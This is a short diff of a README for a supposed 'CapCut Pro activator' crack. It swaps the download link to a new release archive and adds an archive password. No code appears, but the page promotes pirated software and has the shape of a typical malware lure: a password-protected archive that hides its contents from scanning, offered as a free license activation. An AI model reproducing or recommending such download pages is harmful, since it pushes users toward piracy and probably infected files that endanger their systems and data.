@@ -1,7 +1,7 @@
 # <h1 align="center">CapCut Pro activator</h1>
 
-# [DOWNLOAD](https://github.com/Zamarudo/Capcut-Pro-crack/releases/download/v.534.534.645/Capcut_Pro_v31.7z)
-
+# [DOWNLOAD](https://github.com/Zamarudo/Capcut-Pro-crack/releases/download/v.42.56.456.64/Capcut_Pro_v31.zip)
+# Archive password: 2025
 
 One year license activation
 
